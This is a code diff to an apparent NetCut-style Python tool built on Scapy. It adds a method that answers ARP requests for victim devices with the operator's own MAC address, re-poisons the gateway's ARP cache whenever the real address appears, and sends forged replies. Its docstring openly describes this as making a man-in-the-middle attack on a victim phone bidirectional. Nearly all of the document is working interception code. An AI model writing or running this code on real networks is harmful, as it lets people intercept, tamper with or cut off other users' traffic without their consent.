@@ -627,11 +627,66 @@ class NetCutController:
 
     def _capture_loop(self):
         def feed(pkt):
+            self._arp_owner(pkt)
             self.traffic.packet_handler(pkt)
             self.watcher.packet_handler(pkt)
             self.forwarder._on_packet(pkt)
         sniff(iface=self.interface, prn=feed, store=0,
               stop_filter=lambda p: self.capture_stop.is_set())
+
+    def _arp_owner(self, pkt):
+        """Make the MITM bidirectional.
+
+        We already poison the VICTIM (phone, p1) so it sends to us. But the
+        gateway's ARP cache still maps the victim IP to its REAL MAC, so the
+        gateway's replies go straight to the phone in an L2 frame that the
+        phone (expecting our MAC) drops -> down_frames stays 0 -> no internet.
+
+        This answers EVERY 'who-has <victim-ip>' from anywhere with OUR MAC,
+        re-arming the gateway/AP before it can resolve the real MAC. Also
+        answers the victim's 'who-has <gateway>' with our MAC for robustness.
+        """
+        try:
+            if ARP not in pkt: return
+            a = pkt[ARP]
+            claims = {}
+            for d in self.devices:
+                if d.spoof_stop and not d.spoof_stop.is_set():
+                    claims[d.ip] = d.mac
+            if not claims: return
+            if a.op == 1:  # who-has
+                if a.pdst in claims:
+                    reply = Ether(dst=pkt.src, src=self.our_mac) / ARP(
+                        op=2, hwsrc=self.our_mac, psrc=a.pdst,
+                        hwdst=pkt.src, pdst=a.psrc)
+                    self._arp_send(reply)
+                elif a.pdst == self.gateway_ip and a.psrc in claims:
+                    reply = Ether(dst=self.gateway_mac, src=self.our_mac) / ARP(
+                        op=2, hwsrc=self.our_mac, psrc=self.gateway_ip,
+                        hwdst=self.our_mac, pdst=a.psrc)
+                    self._arp_send(reply)
+            elif a.op == 2 and self.gateway_ip is not None:
+                # Someone answered who-has gateway not via us -> re-poison it
+                if a.psrc == self.gateway_ip and a.hwsrc != self.our_mac:
+                    for ip in claims:
+                        force = Ether(dst=self.gateway_mac, src=self.our_mac) / ARP(
+                            op=2, hwsrc=self.our_mac, psrc=ip,
+                            hwdst=self.gateway_mac, pdst=self.gateway_ip)
+                        self._arp_send(force)
+        except Exception:
+            pass
+
+    def _arp_send(self, pkt):
+        try:
+            if self.forwarder and self.forwarder.sock is not None:
+                self.forwarder.sock.send(bytes(pkt))
+            else:
+                sendp(pkt, iface=self.interface, verbose=False)
+        except Exception:
+            try:
+                sendp(pkt, iface=self.interface, verbose=False)
+            except Exception:
+                pass
 
     def merge_scan_results(self, found):
         now = time.time()
